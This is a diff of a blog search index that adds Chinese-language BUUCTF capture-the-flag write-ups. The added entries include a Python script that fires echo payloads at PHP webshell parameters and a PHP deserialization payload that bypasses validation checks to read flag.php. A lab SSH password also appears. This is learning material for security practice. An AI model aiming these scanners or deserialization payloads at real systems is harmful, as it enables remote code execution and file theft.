@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>web</title>
+    <title>mutiple</title>
     <url>/2021/05/12/buu/buuctf/</url>
     <content><![CDATA[<h2 id="Linux-Labs"><a href="#Linux-Labs" class="headerlink" title="Linux Labs"></a>Linux Labs</h2><p><img src="/2021/05/12/buu/buuctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(144).png"></p>
 <p>打开靶机后提示连接</p>
 <p>指令格式 ssh -p port</p>
-<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x6e;&#111;&#x64;&#x65;&#51;&#46;&#x62;&#117;&#117;&#111;&#106;&#46;&#x63;&#110;">&#114;&#x6f;&#x6f;&#116;&#x40;&#x6e;&#111;&#x64;&#x65;&#51;&#46;&#x62;&#117;&#117;&#111;&#106;&#46;&#x63;&#110;</a></p>
+<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x6e;&#111;&#x64;&#101;&#51;&#46;&#x62;&#117;&#x75;&#x6f;&#106;&#46;&#x63;&#110;">&#x72;&#x6f;&#111;&#116;&#64;&#x6e;&#111;&#x64;&#101;&#51;&#46;&#x62;&#117;&#x75;&#x6f;&#106;&#46;&#x63;&#110;</a></p>
 <p>密码：123456</p>
 <h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开容器页面后</p>
 <p>出现三份.txt</p>
@@ -129,7 +129,7 @@
 <p>这里主要记录一下**<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code>**</p>
 ]]></content>
       <tags>
-        <tag>BUU-CTF</tag>
+        <tag>buu</tag>
       </tags>
   </entry>
   <entry>
@@ -1692,6 +1692,78 @@
 ]]></content>
       <tags>
         <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网杯 2019高明的黑客</title>
+    <url>/2021/07/26/buu/1/</url>
+    <content><![CDATA[<p><img src="/2021/07/26/buu/1/image-20210726102939511.png" alt="image-20210726102939511"></p>
+<p>打开靶机后，网页提示下载源码：<a href="http://www.tar.gz/">www.tar.gz</a> </p>
+<p>猜测里面包含可以利用的漏洞文件。</p>
+<p>然后开始了漫长的下载。。。</p>
+<p>下载完成后，我们发现里面包含的文件挺多的，而且是很多都为木马文件，所以排除了用360侦测出目标文件。</p>
+<p>查看某些文件发现可以利用GET和POST传参利用。</p>
+<p>找到大佬写的脚本，用python来跑就不用一个个试了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1&#x3D;threading.Semaphore(100)  							  			#这儿设置最大的线程数</span><br><span class="line">filePath &#x3D; r&quot;D:&#x2F;soft&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;src&#x2F;&quot;</span><br><span class="line">os.chdir(filePath)													#改变当前的路径</span><br><span class="line">requests.adapters.DEFAULT_RETRIES &#x3D; 5								#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files &#x3D; os.listdir(filePath)</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line">session.keep_alive &#x3D; False											 # 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding&#x3D;&#39;utf-8&#39;) as f:							#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">            posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">    data &#x3D; &#123;&#125;														#所有的$_POST</span><br><span class="line">    params &#x3D; &#123;&#125;														#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;src&#x2F;&#39;+file</span><br><span class="line">    req &#x3D; session.post(url, data&#x3D;data, params&#x3D;params)			#一次性请求所有的GET和POST</span><br><span class="line">    req.close()												# 关闭请求  释放内存</span><br><span class="line">    req.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    content &#x3D; req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:									#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag &#x3D; 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req &#x3D; session.get(url+&#39;?%s&#x3D;&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)</span><br><span class="line">            content &#x3D; req.text</span><br><span class="line">            req.close()												# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">        if flag !&#x3D; 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req &#x3D; session.post(url, data&#x3D;&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)</span><br><span class="line">                content &#x3D; req.text</span><br><span class="line">                req.close()												# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag &#x3D;&#x3D; 1:													#flag用来判断参数是GET还是POST，如果是GET，flag&#x3D;&#x3D;1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param &#x3D; a</span><br><span class="line">        else:</span><br><span class="line">            param &#x3D; b</span><br><span class="line">        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/26/buu/1/image-20210726114732836.png" alt="image-20210726114732836"></p>
+<p>真的太膜拜了，单线程的脚本我都不会写。。。</p>
+<p>如图找到了可利用参数和文件</p>
+<p>接下来就是进行访问对应文件来进行利用</p>
+<p>结果如图</p>
+<p><img src="/2021/07/26/buu/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(301).png" alt="屏幕截图(301)"></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯 2020 青龙组AreUSerialz</title>
+    <url>/2021/07/26/buu/2/</url>
+    <content><![CDATA[<p>​    打开后，出现代码页面</p>
+<p><img src="/2021/07/26/buu/2/image-20210726194801767.png" alt="image-20210726194801767"></p>
+<p>​    处理到vs上</p>
+<p><img src="/2021/07/26/buu/2/image-20210726194850909.png" alt="image-20210726194850909"></p>
+<p>接着我们逐段分析：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​    包含了名为flag.php的文件。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected $op;</span><br><span class="line"></span><br><span class="line">protected $filename;</span><br><span class="line"></span><br><span class="line">protected $content;</span><br></pre></td></tr></table></figure>
+
+<p>​    受保护方法的三个变量</p>
+<p>接下来是借鉴了大佬博客</p>
+<p>经过分析，这个题目需要传入一个序列化之后的类对象（因为最后的valid函数会进行一步反序列化），并且要绕过两层防护：</p>
+<p>两个防护：<br><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line"></span><br><span class="line">  for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line"></span><br><span class="line">​    if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line"></span><br><span class="line">​      return false;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里用到了python的ord函数：</p>
+<p>[^]: ord () 函数是 chr () 函数（对于8位的ASCII字符串）或 unichr () 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值</p>
+<p>绕过方法：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p>
+<p><strong><em>destruct()魔术方法</em></strong><br>op===”2”，是强比较，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p> <strong>而在process()函数中,</strong></p>
+<p>op==”2”是弱比较</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p> 绕过方法：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true.</p>
+<p><img src="/2021/07/26/buu/2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>绕过之后，就是到了关键一步，要进行本地序列化操作：</p>
+<p>我直接照搬了大佬的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public  $op &#x3D; 2;</span><br><span class="line">    public  $filename &#x3D; &quot;flag.php&quot;;</span><br><span class="line">    public  $content &#x3D; &quot;1&quot;;        &#x2F;&#x2F;因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new FileHandler();</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问xu.php</p>
+<p><img src="/2021/07/26/buu/2/image-20210726200434420.png" alt="image-20210726200434420"></p>
+<p>​        构建payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        F12得到flag：</p>
+<p><img src="/2021/07/26/buu/2/image-20210726200827967.png" alt="image-20210726200827967"></p>
+<p>本文借鉴于：[<a href="https://blog.csdn.net/RABCDXB/article/details/114297291">网鼎杯 2020 青龙组]AreUSerialz_RABCDXB的博客-CSDN博客</a></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
       </tags>
   </entry>
 </search>
